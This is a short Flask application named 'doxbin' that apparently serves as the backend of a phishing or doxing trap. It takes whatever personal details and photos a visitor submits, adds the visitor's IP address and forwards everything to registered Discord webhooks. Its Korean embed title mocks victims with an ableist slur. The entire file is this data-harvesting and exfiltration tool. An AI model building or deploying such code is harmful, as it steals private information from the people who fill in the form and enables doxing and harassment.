from flask import Flask, request, render_template, jsonify, send_from_directory
import sqlite3
import requests
import os
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_FOLDER = 'static/uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    conn = sqlite3.connect('doxbin.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS webhooks (url TEXT UNIQUE)''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/static/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/register-webhook', methods=['POST'])
def register_webhook():
    url = request.json.get('webhook')
    if url and url.startswith('https://discord.com/api/webhooks/'):
        conn = sqlite3.connect('doxbin.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO webhooks VALUES (?)", (url,))
        conn.commit()
        conn.close()
        return jsonify({"status": "registered"})
    return jsonify({"error": "invalid webhook"}), 400

@app.route('/submit', methods=['POST'])
def submit():
    data = request.form.to_dict()
    photo = request.files.get('photo')

    embed = {
        "title": "어떤 장애인이 걸렸을까나~",
        "color": 16711680,
        "timestamp": request.headers.get('Date'),
        "fields": [],
        "footer": {"text": f"IP: {request.remote_addr}"}
    }

    for key, value in data.items():
        if value.strip():
            embed["fields"].append({
                "name": key.replace('_', ' ').title(),
                "value": value[:1024],
                "inline": False
            })

    files_to_send = None
    if photo and photo.filename:
        filename = secure_filename(photo.filename)
        photo_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        photo.save(photo_path)
        photo_url = f"https://{request.host}/static/uploads/{filename}"
        embed["image"] = {"url": photo_url}
        files_to_send = {'file': open(photo_path, 'rb')} if os.path.exists(photo_path) else None

    conn = sqlite3.connect('doxbin.db')
    c = conn.cursor()
    c.execute("SELECT url FROM webhooks")
    for (url,) in c.fetchall():
        try:
            requests.post(url, json={"embeds": [embed]})
            if files_to_send:
                files_to_send['file'].seek(0)
                requests.post(url, data={"payload_json": (None, '{"content": ""}', 'application/json')},
                              files={"file": (filename, files_to_send['file'])})
        except: pass
    conn.close()

    if files_to_send: files_to_send['file'].close()

    return jsonify({"status": "보내기 성공~"})

if __name__ == "__main__":
    app.run()
